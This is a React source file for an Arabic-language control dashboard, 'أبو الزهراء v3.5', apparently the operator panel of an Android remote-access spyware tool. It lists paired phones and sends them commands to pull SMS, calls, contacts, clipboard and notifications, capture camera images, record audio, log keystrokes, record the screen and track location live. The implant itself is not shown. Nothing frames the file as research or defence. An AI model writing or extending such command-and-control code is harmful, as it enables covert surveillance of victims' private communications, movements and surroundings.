'use client'

import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { ScrollArea } from '@/components/ui/scroll-area'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Switch } from '@/components/ui/switch'
import { Separator } from '@/components/ui/separator'
import { 
  Smartphone, 
  Activity, 
  Settings, 
  Terminal, 
  FileText,
  Shield,
  Monitor,
  Wifi,
  Battery,
  MapPin,
  Bell,
  RefreshCw,
  Link2,
  Trash2,
  Eye,
  Play,
  Square,
  Camera,
  Mic,
  Volume2,
  Sun,
  Plane,
  Flashlight,
  Bluetooth,
  Database,
  Users,
  Clock,
  Server,
  AlertCircle
} from 'lucide-react'

interface Device {
  id: string
  name: string | null
  model: string | null
  brand: string | null
  os: string | null
  battery: string | null
  network: string | null
  location: string | null
  active: boolean
  lastSeen: Date | null
  createdAt: Date
}

interface Command {
  id: string
  deviceId: string
  command: string
  status: string
  result: string | null
  createdAt: Date
  device?: Device
}

interface Stats {
  devicesTotal: number
  devicesOnline: number
  commandsTotal: number
  commandsPending: number
  commandsCompleted: number
  eventsTotal: number
  totalRegisteredCommands: number
  serverTime: string
}

const COMMAND_CATEGORIES = {
  data: { 
    label: 'جمع البيانات', 
    icon: Database, 
    commands: [
      { name: 'sms', label: 'الرسائل', icon: FileText, cmd: 'get_sms' },
      { name: 'calls', label: 'المكالمات', icon: Phone, cmd: 'get_calls' },
      { name: 'contacts', label: 'جهات الاتصال', icon: Users, cmd: 'get_contacts' },
      { name: 'location', label: 'الموقع', icon: MapPin, cmd: 'get_location' },
      { name: 'notifications', label: 'الإشعارات', icon: Bell, cmd: 'get_notifications' },
      { name: 'apps', label: 'التطبيقات', icon: Smartphone, cmd: 'get_apps' },
      { name: 'battery', label: 'البطارية', icon: Battery, cmd: 'get_battery' },
      { name: 'clipboard', label: 'الحافظة', icon: FileText, cmd: 'get_clipboard' },
      { name: 'wifi_info', label: 'الواي فاي', icon: Wifi, cmd: 'get_wifi_info' },
    ]
  },
  control: { 
    label: 'التحكم عن بعد', 
    icon: Settings, 
    commands: [
      { name: 'screenshot', label: 'لقطة شاشة', icon: Camera, cmd: 'screenshot' },
      { name: 'front_camera', label: 'كاميرا أمامية', icon: Camera, cmd: 'front_camera' },
      { name: 'back_camera', label: 'كاميرا خلفية', icon: Camera, cmd: 'back_camera' },
      { name: 'record_audio', label: 'تسجيل صوت', icon: Mic, cmd: 'record_audio' },
      { name: 'lock_phone', label: 'قفل الهاتف', icon: Shield, cmd: 'lock_phone' },
      { name: 'ring', label: 'رنين', icon: Volume2, cmd: 'ring' },
      { name: 'vibrate', label: 'اهتزاز', icon: Activity, cmd: 'vibrate' },
      { name: 'set_brightness', label: 'السطوع', icon: Sun, cmd: 'set_brightness' },
    ]
  },
  monitor: { 
    label: 'المراقبة', 
    icon: Monitor, 
    commands: [
      { name: 'keylogger_start', label: 'تسجيل المفاتيح - بدء', icon: Play, cmd: 'keylogger_start' },
      { name: 'keylogger_stop', label: 'تسجيل المفاتيح - إيقاف', icon: Square, cmd: 'keylogger_stop' },
      { name: 'location_live', label: 'تتبع مباشر', icon: MapPin, cmd: 'location_live' },
      { name: 'location_stop', label: 'إيقاف التتبع', icon: Square, cmd: 'location_stop' },
      { name: 'screen_record_start', label: 'تسجيل الشاشة', icon: Play, cmd: 'screen_record_start' },
    ]
  },
  system: { 
    label: 'النظام', 
    icon: Server, 
    commands: [
      { name: 'enable_wifi', label: 'تشغيل واي فاي', icon: Wifi, cmd: 'enable_wifi' },
      { name: 'disable_wifi', label: 'إيقاف واي فاي', icon: Wifi, cmd: 'disable_wifi' },
      { name: 'airplane_on', label: 'وضع الطيران', icon: Plane, cmd: 'airplane_on' },
      { name: 'airplane_off', label: 'إيقاف الطيران', icon: Plane, cmd: 'airplane_off' },
      { name: 'torch_on', label: 'تشغيل الكشاف', icon: Flashlight, cmd: 'torch_on' },
      { name: 'torch_off', label: 'إيقاف الكشاف', icon: Flashlight, cmd: 'torch_off' },
      { name: 'enable_bluetooth', label: 'تشغيل بلوتوث', icon: Bluetooth, cmd: 'enable_bluetooth' },
    ]
  },
}

function Phone({ className }: { className?: string }) {
  return <Smartphone className={className} />
}

export default function Dashboard() {
  const [devices, setDevices] = useState<Device[]>([])
  const [commands, setCommands] = useState<Command[]>([])
  const [stats, setStats] = useState<Stats | null>(null)
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null)
  const [linkCode, setLinkCode] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [activeTab, setActiveTab] = useState('dashboard')

  // Fetch data
  const fetchData = async () => {
    try {
      const [devicesRes, commandsRes, statsRes] = await Promise.all([
        fetch('/api/devices'),
        fetch('/api/commands?limit=50'),
        fetch('/api/stats')
      ])

      const devicesData = await devicesRes.json()
      const commandsData = await commandsRes.json()
      const statsData = await statsRes.json()

      if (devicesData.ok) setDevices(devicesData.devices)
      if (commandsData.ok) setCommands(commandsData.commands)
      if (statsData.ok) setStats(statsData.stats)
    } catch (error) {
      console.error('Error fetching data:', error)
    }
  }

  useEffect(() => {
    let mounted = true
    
    const loadData = async () => {
      try {
        const [devicesRes, commandsRes, statsRes] = await Promise.all([
          fetch('/api/devices'),
          fetch('/api/commands?limit=50'),
          fetch('/api/stats')
        ])

        const devicesData = await devicesRes.json()
        const commandsData = await commandsRes.json()
        const statsData = await statsRes.json()

        if (mounted) {
          if (devicesData.ok) setDevices(devicesData.devices)
          if (commandsData.ok) setCommands(commandsData.commands)
          if (statsData.ok) setStats(statsData.stats)
        }
      } catch (error) {
        console.error('Error fetching data:', error)
      }
    }
    
    loadData()
    const interval = setInterval(loadData, 10000) // Refresh every 10s
    return () => {
      mounted = false
      clearInterval(interval)
    }
  }, [])

  // Generate link code
  const generateLinkCode = async () => {
    setLoading(true)
    try {
      const res = await fetch('/api/link-code', { method: 'POST' })
      const data = await res.json()
      if (data.ok) {
        setLinkCode(data.code)
      }
    } catch (error) {
      console.error('Error generating link code:', error)
    }
    setLoading(false)
  }

  // Send command
  const sendCommand = async (cmd: string, params?: Record<string, unknown>) => {
    if (!selectedDevice) return
    setLoading(true)
    try {
      const res = await fetch('/api/commands', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceId: selectedDevice.id,
          command: cmd,
          params
        })
      })
      const data = await res.json()
      if (data.ok) {
        fetchData()
      }
    } catch (error) {
      console.error('Error sending command:', error)
    }
    setLoading(false)
  }

  // Delete device
  const deleteDevice = async (deviceId: string) => {
    if (!confirm('هل أنت متأكد من إلغاء ربط هذا الجهاز؟')) return
    try {
      await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' })
      setSelectedDevice(null)
      fetchData()
    } catch (error) {
      console.error('Error deleting device:', error)
    }
  }

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'completed': return 'bg-green-500'
      case 'pending': return 'bg-yellow-500'
      case 'sent': return 'bg-blue-500'
      case 'error': return 'bg-red-500'
      default: return 'bg-gray-500'
    }
  }

  const formatTime = (date: Date | null | string) => {
    if (!date) return '-'
    return new Date(date).toLocaleString('ar-EG')
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-white" dir="rtl">
      {/* Header */}
      <header className="border-b border-slate-700 bg-slate-900/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 bg-gradient-to-br from-red-500 to-red-700 rounded-xl flex items-center justify-center">
                <Shield className="w-6 h-6" />
              </div>
              <div>
                <h1 className="text-xl font-bold">أبو الزهراء</h1>
                <p className="text-xs text-slate-400">لوحة التحكم المتكاملة</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Badge variant="outline" className="bg-green-500/10 text-green-400 border-green-500/50">
                <Activity className="w-3 h-3 ml-1" />
                متصل
              </Badge>
              <Button variant="outline" size="icon" onClick={fetchData}>
                <RefreshCw className="w-4 h-4" />
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6">
        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="bg-slate-800/50 border border-slate-700">
            <TabsTrigger value="dashboard" className="data-[state=active]:bg-red-600">
              <Activity className="w-4 h-4 ml-2" />
              الرئيسية
            </TabsTrigger>
            <TabsTrigger value="devices" className="data-[state=active]:bg-red-600">
              <Smartphone className="w-4 h-4 ml-2" />
              الأجهزة
            </TabsTrigger>
            <TabsTrigger value="commands" className="data-[state=active]:bg-red-600">
              <Terminal className="w-4 h-4 ml-2" />
              الأوامر
            </TabsTrigger>
            <TabsTrigger value="logs" className="data-[state=active]:bg-red-600">
              <FileText className="w-4 h-4 ml-2" />
              السجلات
            </TabsTrigger>
          </TabsList>

          {/* Dashboard Tab */}
          <TabsContent value="dashboard" className="space-y-6">
            {/* Stats Cards */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-sm">الأجهزة</p>
                      <p className="text-2xl font-bold">{stats?.devicesTotal || 0}</p>
                    </div>
                    <div className="w-12 h-12 bg-blue-500/20 rounded-xl flex items-center justify-center">
                      <Smartphone className="w-6 h-6 text-blue-400" />
                    </div>
                  </div>
                  <p className="text-xs text-green-400 mt-2">
                    🟢 {stats?.devicesOnline || 0} متصل
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-sm">الأوامر</p>
                      <p className="text-2xl font-bold">{stats?.commandsTotal || 0}</p>
                    </div>
                    <div className="w-12 h-12 bg-yellow-500/20 rounded-xl flex items-center justify-center">
                      <Terminal className="w-6 h-6 text-yellow-400" />
                    </div>
                  </div>
                  <p className="text-xs text-yellow-400 mt-2">
                    ⏳ {stats?.commandsPending || 0} معلق
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-sm">مكتمل</p>
                      <p className="text-2xl font-bold">{stats?.commandsCompleted || 0}</p>
                    </div>
                    <div className="w-12 h-12 bg-green-500/20 rounded-xl flex items-center justify-center">
                      <Activity className="w-6 h-6 text-green-400" />
                    </div>
                  </div>
                  <p className="text-xs text-green-400 mt-2">
                    ✅ تم تنفيذه
                  </p>
                </CardContent>
              </Card>

              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="p-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-slate-400 text-sm">الأحداث</p>
                      <p className="text-2xl font-bold">{stats?.eventsTotal || 0}</p>
                    </div>
                    <div className="w-12 h-12 bg-purple-500/20 rounded-xl flex items-center justify-center">
                      <FileText className="w-6 h-6 text-purple-400" />
                    </div>
                  </div>
                  <p className="text-xs text-slate-400 mt-2">
                    📋 إجمالي السجلات
                  </p>
                </CardContent>
              </Card>
            </div>

            {/* Quick Actions & Recent Devices */}
            <div className="grid md:grid-cols-2 gap-6">
              {/* Quick Actions */}
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Terminal className="w-5 h-5 text-red-400" />
                    إجراءات سريعة
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 gap-3">
                    {devices.filter(d => d.active).slice(0, 1).map(device => (
                      <>
                        <Button 
                          key={`screenshot-${device.id}`}
                          className="bg-slate-700 hover:bg-slate-600 justify-start"
                          onClick={() => { setSelectedDevice(device); sendCommand('screenshot'); }}
                        >
                          <Camera className="w-4 h-4 ml-2" />
                          لقطة شاشة
                        </Button>
                        <Button 
                          key={`location-${device.id}`}
                          className="bg-slate-700 hover:bg-slate-600 justify-start"
                          onClick={() => { setSelectedDevice(device); sendCommand('get_location'); }}
                        >
                          <MapPin className="w-4 h-4 ml-2" />
                          الموقع
                        </Button>
                        <Button 
                          key={`battery-${device.id}`}
                          className="bg-slate-700 hover:bg-slate-600 justify-start"
                          onClick={() => { setSelectedDevice(device); sendCommand('get_battery'); }}
                        >
                          <Battery className="w-4 h-4 ml-2" />
                          البطارية
                        </Button>
                        <Button 
                          key={`apps-${device.id}`}
                          className="bg-slate-700 hover:bg-slate-600 justify-start"
                          onClick={() => { setSelectedDevice(device); sendCommand('get_apps'); }}
                        >
                          <Smartphone className="w-4 h-4 ml-2" />
                          التطبيقات
                        </Button>
                      </>
                    ))}
                    {devices.filter(d => d.active).length === 0 && (
                      <div className="col-span-2 text-center text-slate-400 py-4">
                        لا توجد أجهزة متصلة
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>

              {/* Recent Commands */}
              <Card className="bg-slate-800/50 border-slate-700">
                <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Clock className="w-5 h-5 text-red-400" />
                    آخر الأوامر
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-48">
                    {commands.slice(0, 10).map(cmd => (
                      <div key={cmd.id} className="flex items-center justify-between py-2 border-b border-slate-700 last:border-0">
                        <div>
                          <p className="font-medium text-sm">{cmd.command}</p>
                          <p className="text-xs text-slate-400">{cmd.device?.name || cmd.deviceId}</p>
                        </div>
                        <Badge className={`${getStatusColor(cmd.status)} text-white text-xs`}>
                          {cmd.status}
                        </Badge>
                      </div>
                    ))}
                    {commands.length === 0 && (
                      <div className="text-center text-slate-400 py-4">
                        لا توجد أوامر
                      </div>
                    )}
                  </ScrollArea>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Devices Tab */}
          <TabsContent value="devices" className="space-y-6">
            {/* Link Device */}
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Link2 className="w-5 h-5 text-red-400" />
                  ربط جهاز جديد
                </CardTitle>
                <CardDescription>
                  أنشئ كود ربط وأدخله في تطبيق الأندرويد
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="flex items-center gap-4">
                  <Button 
                    onClick={generateLinkCode}
                    disabled={loading}
                    className="bg-red-600 hover:bg-red-700"
                  >
                    {loading ? (
                      <RefreshCw className="w-4 h-4 ml-2 animate-spin" />
                    ) : (
                      <Link2 className="w-4 h-4 ml-2" />
                    )}
                    إنشاء كود
                  </Button>
                  {linkCode && (
                    <div className="flex items-center gap-2 bg-slate-700 px-4 py-2 rounded-lg">
                      <span className="text-slate-400 text-sm">الكود:</span>
                      <code className="text-xl font-bold text-red-400">{linkCode}</code>
                    </div>
                  )}
                </div>
              </CardContent>
            </Card>

            {/* Devices List */}
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
              {devices.map(device => (
                <Card 
                  key={device.id} 
                  className={`bg-slate-800/50 border-slate-700 cursor-pointer transition-all hover:border-red-500/50 ${
                    selectedDevice?.id === device.id ? 'border-red-500' : ''
                  }`}
                  onClick={() => setSelectedDevice(device)}
                >
                  <CardContent className="p-4">
                    <div className="flex items-start justify-between">
                      <div>
                        <div className="flex items-center gap-2">
                          <div className={`w-3 h-3 rounded-full ${device.active ? 'bg-green-500' : 'bg-red-500'}`} />
                          <h3 className="font-bold">{device.name || device.id}</h3>
                        </div>
                        <p className="text-sm text-slate-400 mt-1">{device.model || 'غير محدد'}</p>
                      </div>
                      <Badge variant={device.active ? 'default' : 'secondary'} className={device.active ? 'bg-green-600' : ''}>
                        {device.active ? 'متصل' : 'غير متصل'}
                      </Badge>
                    </div>
                    <div className="grid grid-cols-2 gap-2 mt-4 text-xs">
                      <div className="flex items-center gap-1 text-slate-400">
                        <Battery className="w-3 h-3" />
                        {device.battery || '-'}%
                      </div>
                      <div className="flex items-center gap-1 text-slate-400">
                        <Wifi className="w-3 h-3" />
                        {device.network || '-'}
                      </div>
                    </div>
                    <p className="text-xs text-slate-500 mt-2">
                      آخر ظهور: {formatTime(device.lastSeen)}
                    </p>
                  </CardContent>
                </Card>
              ))}
              {devices.length === 0 && (
                <div className="col-span-full text-center py-12 text-slate-400">
                  <Smartphone className="w-12 h-12 mx-auto mb-4 opacity-50" />
                  <p>لا توجد أجهزة مربوطة</p>
                  <p className="text-sm mt-2">استخدم زر "إنشاء كود" لربط جهاز جديد</p>
                </div>
              )}
            </div>
          </TabsContent>

          {/* Commands Tab */}
          <TabsContent value="commands" className="space-y-6">
            {selectedDevice ? (
              <>
                {/* Selected Device Info */}
                <Card className="bg-slate-800/50 border-slate-700">
                  <CardContent className="p-4">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div className={`w-4 h-4 rounded-full ${selectedDevice.active ? 'bg-green-500' : 'bg-red-500'}`} />
                        <div>
                          <h3 className="font-bold">{selectedDevice.name || selectedDevice.id}</h3>
                          <p className="text-sm text-slate-400">{selectedDevice.model} • {selectedDevice.os}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <Button variant="outline" size="sm" onClick={() => setSelectedDevice(null)}>
                          إلغاء التحديد
                        </Button>
                        <Button variant="destructive" size="sm" onClick={() => deleteDevice(selectedDevice.id)}>
                          <Trash2 className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Commands Grid */}
                <div className="grid md:grid-cols-2 gap-6">
                  {Object.entries(COMMAND_CATEGORIES).map(([key, category]) => (
                    <Card key={key} className="bg-slate-800/50 border-slate-700">
                      <CardHeader>
                        <CardTitle className="text-lg flex items-center gap-2">
                          <category.icon className="w-5 h-5 text-red-400" />
                          {category.label}
                        </CardTitle>
                      </CardHeader>
                      <CardContent>
                        <div className="grid grid-cols-2 gap-2">
                          {category.commands.map(cmd => (
                            <Button
                              key={cmd.name}
                              variant="outline"
                              className="justify-start bg-slate-700/50 hover:bg-slate-600 border-slate-600"
                              onClick={() => sendCommand(cmd.cmd)}
                              disabled={loading || !selectedDevice.active}
                            >
                              <cmd.icon className="w-4 h-4 ml-2" />
                              {cmd.label}
                            </Button>
                          ))}
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </>
            ) : (
              <Card className="bg-slate-800/50 border-slate-700">
                <CardContent className="py-12 text-center">
                  <AlertCircle className="w-12 h-12 mx-auto mb-4 text-slate-400" />
                  <p className="text-slate-400">اختر جهازاً من قائمة الأجهزة للتحكم به</p>
                  <Button 
                    variant="outline" 
                    className="mt-4"
                    onClick={() => setActiveTab('devices')}
                  >
                    عرض الأجهزة
                  </Button>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          {/* Logs Tab */}
          <TabsContent value="logs" className="space-y-6">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <FileText className="w-5 h-5 text-red-400" />
                  سجل الأوامر
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-96">
                  <table className="w-full">
                    <thead className="sticky top-0 bg-slate-800">
                      <tr className="text-slate-400 text-sm">
                        <th className="text-right py-2">الأمر</th>
                        <th className="text-right py-2">الجهاز</th>
                        <th className="text-right py-2">الحالة</th>
                        <th className="text-right py-2">الوقت</th>
                      </tr>
                    </thead>
                    <tbody>
                      {commands.map(cmd => (
                        <tr key={cmd.id} className="border-t border-slate-700">
                          <td className="py-2 font-mono text-sm">{cmd.command}</td>
                          <td className="py-2 text-sm">{cmd.device?.name || cmd.deviceId}</td>
                          <td className="py-2">
                            <Badge className={`${getStatusColor(cmd.status)} text-white text-xs`}>
                              {cmd.status}
                            </Badge>
                          </td>
                          <td className="py-2 text-xs text-slate-400">
                            {formatTime(cmd.createdAt)}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                  {commands.length === 0 && (
                    <div className="text-center py-8 text-slate-400">
                      لا توجد أوامر مسجلة
                    </div>
                  )}
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-700 bg-slate-900/50 mt-auto">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between text-sm text-slate-400">
            <span>🟥 أبو الزهراء v3.5 - لوحة التحكم المتكاملة</span>
            <span>الأوامر المتاحة: {stats?.totalRegisteredCommands || 200}+</span>
          </div>
        </div>
      </footer>
    </div>
  )
}
